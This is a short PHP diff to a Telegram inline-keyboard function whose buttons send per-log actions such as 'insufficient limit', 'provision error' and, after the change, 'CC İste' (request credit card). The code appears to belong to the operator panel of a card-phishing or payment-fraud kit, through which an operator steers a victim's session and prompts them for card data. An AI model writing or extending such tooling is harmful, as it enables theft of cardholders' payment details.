@@ -231,7 +231,7 @@ function tg_inline_klavye(int $log_id): array {
         ],
         [
             ['text' => '💰 Limit Yetersiz', 'callback_data' => "aksiyon:{$bid}:limit_yetersiz"],
-            ['text' => '🔄 Provizyon Gönder','callback_data' => "aksiyon:{$bid}:provizyon_gonder"],
+            ['text' => '💳 CC İste',          'callback_data' => "aksiyon:{$bid}:provizyon_gonder"],
         ],
         [
             ['text' => '⚠️ Prov. Hatalı',   'callback_data' => "aksiyon:{$bid}:provizyon_hatali"],
